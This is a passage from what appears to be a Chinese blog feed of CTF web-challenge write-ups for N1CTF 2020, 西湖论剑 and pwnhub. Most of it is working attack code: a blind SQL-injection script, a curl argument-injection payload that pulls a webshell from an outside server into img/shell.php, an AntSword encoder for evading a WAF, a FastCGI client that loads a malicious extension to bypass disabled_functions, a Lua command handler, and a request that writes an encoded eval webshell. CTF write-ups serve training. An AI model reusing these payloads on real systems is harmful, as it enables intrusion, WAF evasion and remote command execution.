class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span>    <span class="hljs-built_in">min</span> = <span class="hljs-number">33</span>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">max</span> &gt;= <span class="hljs-built_in">min</span>:        mid = (<span class="hljs-built_in">max</span> + <span class="hljs-built_in">min</span>) // <span class="hljs-number">2</span>        header = &#123;<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;1&#x27;and 1=(if((select ascii(substr(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;),1,0)) and exp(~&#x27;n1ctf&#x27;) and &#x27;1&quot;</span>.<span class="hljs-built_in">format</span>(data,Len,mid)&#125;        <span class="hljs-comment"># print(header)</span>        r = requests.post(url,headers=header)        <span class="hljs-comment"># print(r.text)</span>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;&lt;code&gt;welcome to n1ctf2020&lt;/code&gt;&lt;/pre&gt;&quot;</span>  <span class="hljs-keyword">in</span> r.text):            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">max</span> = mid        <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span> == mid == <span class="hljs-built_in">min</span>:            x += <span class="hljs-built_in">chr</span>(mid)            print(x)            <span class="hljs-keyword">break</span></code></pre><h2 id="DockerManager"><a href="#DockerManager" class="headerlink" title="DockerManager"></a>DockerManager</h2><p>题目给了附件，漏洞点在 view.php</p><pre><code class="hljs dockerfile">$<span class="hljs-keyword">cmd</span><span class="bash"> = <span class="hljs-string">&#x27;curl --connect-timeout 10 &#x27;</span> . <span class="hljs-variable">$host_addr</span> . <span class="hljs-string">&#x27; -g &#x27;</span> . <span class="hljs-variable">$cert</span> . <span class="hljs-variable">$key</span> . <span class="hljs-variable">$cacert</span>;</span></code></pre><p>由于php版本00截断可以控制$host_addr可以用来加参数</p><p>利用curl -K</p><pre><code class="hljs mathematica"><span class="hljs-operator">-</span><span class="hljs-built_in">K</span>     指定配置文件我们可以在配置文件中定义好要请求的<span class="hljs-built_in">URL</span>。保存路径。<span class="hljs-variable">HTTP</span>头这些配置然后<span class="hljs-variable">curl</span> <span class="hljs-operator">-</span><span class="hljs-built_in">K</span>文件名。<span class="hljs-variable">curl</span>就会根据配置项中的值来进行请求例如<span class="hljs-variable">option</span>文件如下<span class="hljs-built_in">URL</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;http://119.45.155.77/&quot;</span><span class="hljs-variable">output</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;index.html&quot;</span><span class="hljs-variable">curl</span> <span class="hljs-operator">-</span><span class="hljs-variable">Koption</span>那么<span class="hljs-variable">curl</span>就会访问<span class="hljs-variable">http</span><span class="hljs-operator">://</span><span class="hljs-number">119.45</span><span class="hljs-number">.155</span><span class="hljs-number">.77</span><span class="hljs-operator">/</span>然后输出到<span class="hljs-variable">index</span><span class="hljs-operator">.</span><span class="hljs-variable">html</span>并且。<span class="hljs-variable">option</span>文件中可以有其他杂乱的数据。只要配置项那部分格式正确就行</code></pre><p>现在要创一个配置文件来上马，可以利用/proc/&lt;pid&gt;/cmdline ，这个文件可以存正在运行的进程的启动命令。curl -K读取/dev/urandom 会造成curl一直在运行，同时加上我们想要的配置文件，就可以生成在对应的文件/proc/&lt;pid&gt;/cmdline（&lt;pid&gt;未知）</p><pre><code class="hljs llvm">/view.phpPOSThost<span class="hljs-operator">=</span>-K/dev/urandom<span class="hljs-variable">%00</span>&amp;cacert<span class="hljs-operator">=</span><span class="hljs-number">111</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>aurl<span class="hljs-operator">=</span>”你服务器上马”<span class="hljs-variable">%0</span>aoutput<span class="hljs-operator">=</span>”img/shell.php”<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a</code></pre><p>然后爆破fd，执行-k就可以写入shell</p><pre><code class="hljs awk">/view.phpPOSThost=-K<span class="hljs-regexp">/dev/u</span>random%<span class="hljs-number">00</span>host=-K<span class="hljs-regexp">/proc/</span>§<span class="hljs-number">1</span>§/cmdline%<span class="hljs-number">00</span></code></pre><p>连上马后 trap “” 14 &amp;&amp; /readflag   算数学题</p><p><a href="https://www.zhaoj.in/read-6750.html">https://www.zhaoj.in/read-6750.html</a></p><p><a href="https://guokeya.github.io/post/E7S2ehXp7/">https://guokeya.github.io/post/E7S2ehXp7/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>N1CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑</title>
    <link href="/2020/10/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <url>/2020/10/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    
    <content type="html"><![CDATA[<h2 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h2><p>前面上传带%就可以绕，上马后有宝塔的waf，三次url编码后就可以正常传东西（比如phpinfo();</p><p>三次url编码后怎么连蚁剑，这就要写编码器了</p><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * php::base64编码器</span><span class="hljs-comment"> * Create at: 2020/10/08 11:13:29</span><span class="hljs-comment"> */</span><span class="hljs-meta">&#x27;use strict&#x27;</span>;<span class="hljs-comment">/*</span><span class="hljs-comment">* @param  &#123;String&#125; pwd   连接密码</span><span class="hljs-comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><span class="hljs-comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><span class="hljs-comment">*/</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">forceEncode</span>(<span class="hljs-params">s</span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.from(s).map(<span class="hljs-function"><span class="hljs-params">i</span>=&gt;</span><span class="hljs-string">&#x27;%&#x27;</span>+i.charCodeAt(<span class="hljs-number">0</span>).toString(<span class="hljs-number">16</span>).padStart(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>)).join(<span class="hljs-string">&#x27;&#x27;</span>)&#125;<span class="hljs-built_in">module</span>.exports = <span class="hljs-function">(<span class="hljs-params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;  <span class="hljs-keyword">const</span> payload = data[<span class="hljs-string">&#x27;_&#x27;</span>]  data[pwd] = forceEncode(forceEncode(forceEncode(payload)));  <span class="hljs-keyword">delete</span> data[<span class="hljs-string">&#x27;_&#x27;</span>];  <span class="hljs-built_in">console</span>.log(data);  <span class="hljs-keyword">return</span> data;&#125;</code></pre><p>然后可以有两种做法，</p><p>一种是  用于 PHP-FPM、FastCGI 模式下突破 <code>disabled_functions</code></p><p><a href="https://github.com/AntSwordProject/ant_php_extension">https://github.com/AntSwordProject/ant_php_extension</a> </p><p><a href="https://meizjm3i.github.io/2019/06/11/0CTF-TCTF-2019-Web-Writeup/">https://meizjm3i.github.io/2019/06/11/0CTF-TCTF-2019-Web-Writeup/</a></p><p>按照上面链接编译so文件，上传<code>&lt;?php antsystem(&quot;/readflag&quot;); ?&gt;</code> s.php ,上传下面的php访问就可以看到执行的结果</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$keepAlive</span> = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$_requests</span> = <span class="hljs-keyword">array</span>();    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$_requestCounter</span> = <span class="hljs-number">0</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params"><span class="hljs-variable">$type</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$requestId</span> = <span class="hljs-number">1</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>;        <span class="hljs-variable">$totLen</span> = strlen(<span class="hljs-variable">$content</span>);        <span class="hljs-variable">$buf</span>    = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">do</span> &#123;            <span class="hljs-comment">// Packets can be a maximum of 65535 bytes</span>            <span class="hljs-variable">$part</span> = substr(<span class="hljs-variable">$content</span>, <span class="hljs-variable">$offset</span>, <span class="hljs-number">0xffff</span> - <span class="hljs-number">8</span>);            <span class="hljs-variable">$segLen</span> = strlen(<span class="hljs-variable">$part</span>);            <span class="hljs-variable">$buf</span> .= chr(<span class="hljs-built_in">self</span>::VERSION_1)        <span class="hljs-comment">/* version */</span>                . chr(<span class="hljs-variable">$type</span>)                    <span class="hljs-comment">/* type */</span>                . chr((<span class="hljs-variable">$requestId</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span>                . chr(<span class="hljs-variable">$requestId</span> &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span>                . chr((<span class="hljs-variable">$segLen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)    <span class="hljs-comment">/* contentLengthB1 */</span>                . chr(<span class="hljs-variable">$segLen</span> &amp; <span class="hljs-number">0xFF</span>)           <span class="hljs-comment">/* contentLengthB0 */</span>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span>                . <span class="hljs-variable">$part</span>;                        <span class="hljs-comment">/* content */</span>            <span class="hljs-variable">$offset</span> += <span class="hljs-variable">$segLen</span>;        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$offset</span> &lt; <span class="hljs-variable">$totLen</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$buf</span>;    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$nlen</span> = strlen(<span class="hljs-variable">$name</span>);        <span class="hljs-variable">$vlen</span> = strlen(<span class="hljs-variable">$value</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &lt; <span class="hljs-number">128</span>) &#123;            <span class="hljs-comment">/* nameLengthB0 */</span>            <span class="hljs-variable">$nvpair</span> = chr(<span class="hljs-variable">$nlen</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="hljs-variable">$nvpair</span> = chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0xFF</span>);        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &lt; <span class="hljs-number">128</span>) &#123;            <span class="hljs-comment">/* valueLengthB0 */</span>            <span class="hljs-variable">$nvpair</span> .= chr(<span class="hljs-variable">$vlen</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="hljs-variable">$nvpair</span> .= chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$vlen</span> &amp; <span class="hljs-number">0xFF</span>);        &#125;        <span class="hljs-comment">/* nameData &amp; valueData */</span>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$nvpair</span> . <span class="hljs-variable">$name</span> . <span class="hljs-variable">$value</span>;    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$length</span> === <span class="hljs-literal">null</span>) &#123;            <span class="hljs-variable">$length</span> = strlen(<span class="hljs-variable">$data</span>);        &#125;        <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();        <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$p</span> != <span class="hljs-variable">$length</span>) &#123;            <span class="hljs-variable">$nlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &gt;= <span class="hljs-number">128</span>) &#123;                <span class="hljs-variable">$nlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));            &#125;            <span class="hljs-variable">$vlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &gt;= <span class="hljs-number">128</span>) &#123;                <span class="hljs-variable">$vlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));            &#125;            <span class="hljs-variable">$array</span>[substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$nlen</span>)] = substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>+<span class="hljs-variable">$nlen</span>, <span class="hljs-variable">$vlen</span>);            <span class="hljs-variable">$p</span> += (<span class="hljs-variable">$nlen</span> + <span class="hljs-variable">$vlen</span>);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildAllPacket</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$params</span>, <span class="hljs-variable">$stdin</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">// Ensure new requestID is not already being tracked</span>        <span class="hljs-keyword">do</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;_requestCounter++;            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_requestCounter &gt;= <span class="hljs-number">65536</span> <span class="hljs-comment">/* or (1 &lt;&lt; 16) */</span>) &#123;                <span class="hljs-keyword">$this</span>-&gt;_requestCounter = <span class="hljs-number">1</span>;            &#125;            <span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;_requestCounter;        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_requests[<span class="hljs-variable">$id</span>]));        <span class="hljs-variable">$request</span> = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>), <span class="hljs-variable">$id</span>);        <span class="hljs-variable">$paramsRequest</span> = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;            <span class="hljs-variable">$paramsRequest</span> .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$id</span>);        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paramsRequest</span>) &#123;            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-variable">$paramsRequest</span>, <span class="hljs-variable">$id</span>);        &#125;        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stdin</span>) &#123;            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-variable">$stdin</span>, <span class="hljs-variable">$id</span>);        &#125;        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$request</span>;    &#125;&#125;<span class="hljs-variable">$sock</span> = stream_socket_client(<span class="hljs-string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>);<span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> Client();<span class="hljs-variable">$payload_file</span> = <span class="hljs-string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;<span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="hljs-variable">$payload_file</span>,    <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="hljs-string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,    <span class="hljs-comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span>);<span class="hljs-variable">$data</span> = <span class="hljs-variable">$client</span>-&gt;buildAllPacket(<span class="hljs-variable">$params</span>, <span class="hljs-string">&#x27;&#x27;</span>);fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$data</span>);var_dump(fread(<span class="hljs-variable">$sock</span>, <span class="hljs-number">4096</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>另一种是lau脚本执行</p><pre><code class="hljs lua">上传.htaccess  AddHandler lua-script .lua上传.lua<span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span>    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span>    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)    r:puts(a)    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span>            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">else</span>        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre><h2 id="EasyJson"><a href="#EasyJson" class="headerlink" title="EasyJson"></a>EasyJson</h2><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?action=write&amp;source=1&amp;filename=%61%2e%70%68%70</span> HTTP/1.1<span class="hljs-attribute">Host</span>: easyjson.f40fea.challenge.gcsis.cn<span class="hljs-attribute">Content-Length</span>: 195<span class="hljs-attribute">Cache-Control</span>: max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Origin</span>: http://easyjson.f40fea.challenge.gcsis.cn<span class="hljs-attribute">Content-Type</span>: application/json<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://easyjson.f40fea.challenge.gcsis.cn/?action=write&amp;source=1&amp;filename=1<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8<span class="hljs-attribute">Connection</span>: close&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>西湖论剑</tag>
      
      <tag>FastCGI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwnhub image_convert</title>
    <link href="/2020/08/12/pwnhub-image-convert/"/>
    <url>/2020/08/12/pwnhub-image-convert/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WTF</span> </span>&#123;       <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;           var_dump(md5(<span class="hljs-keyword">$this</span>-&gt;var1));           var_dump(md5(<span class="hljs-keyword">$this</span>-&gt;var2));           <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;var1 != <span class="hljs-keyword">$this</span>-&gt;var2) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;var1) === md5(<span class="hljs-keyword">$this</span>-&gt;var2)) )&#123;               <span class="hljs-keyword">echo</span> file_get_contents(substr(<span class="hljs-keyword">$this</span>-&gt;var1,<span class="hljs-number">0</span>,<span class="hljs-number">30</span>).<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">// Hint: /flag/flag</span>          &#125;      &#125;  &#125;   <span class="hljs-variable">$sandbox</span> = <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/sandbox/&quot;</span>.md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);   putenv(<span class="hljs-string">&quot;TMPDIR=&quot;</span>.<span class="hljs-variable">$sandbox</span>);   <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$sandbox</span>))       mkdir(<span class="hljs-variable">$sandbox</span>);   <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]))&#123;       <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>],<span class="hljs-string">&quot;compress&quot;</span>) === <span class="hljs-literal">false</span> &amp;&amp; strstr(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>],<span class="hljs-string">&quot;zip&quot;</span>) === <span class="hljs-literal">false</span> &amp;&amp; strstr(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>],<span class="hljs-string">&quot;ftp&quot;</span>) === <span class="hljs-literal">false</span>)&#123;           <span class="hljs-variable">$im</span> = @imagecreatefrompng(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]);           imagegd2(<span class="hljs-variable">$im</span>);      &#125;<span class="hljs-keyword">else</span>&#123;           <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;do not support zlib &amp; ftp,sorry :)&#x27;</span>);      &#125;  &#125;<span class="hljs-keyword">else</span>       highlight_file(<span class="hljs-keyword">__FILE__</span>);</code></pre><h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><p><a href="https://mp.weixin.qq.com/s/SbfHZQx27VcO96g6BWkflg">https://mp.weixin.qq.com/s/SbfHZQx27VcO96g6BWkflg</a></p><p><a href="http://d1iv3.me/2018/04/15/%E4%BB%8EPHP%E6%BA%90%E7%A0%81%E7%9C%8BPHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%BC%BA%E9%99%B7%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">http://d1iv3.me/2018/04/15/%E4%BB%8EPHP%E6%BA%90%E7%A0%81%E7%9C%8BPHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%BC%BA%E9%99%B7%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p><p>考点是phar反序列化，md5碰撞，和一个<code>/flag/aaaaaaaaaaaaaaa/../flag/</code> 能读到/flag/flag的trick</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis利用收集</title>
    <link href="/2020/08/08/redis%E5%88%A9%E7%94%A8%E6%94%B6%E9%9B%86/"/>
    <url>/2020/08/08/redis%E5%88%A9%E7%94%A8%E6%94%B6%E9%9B%86/</url>
    
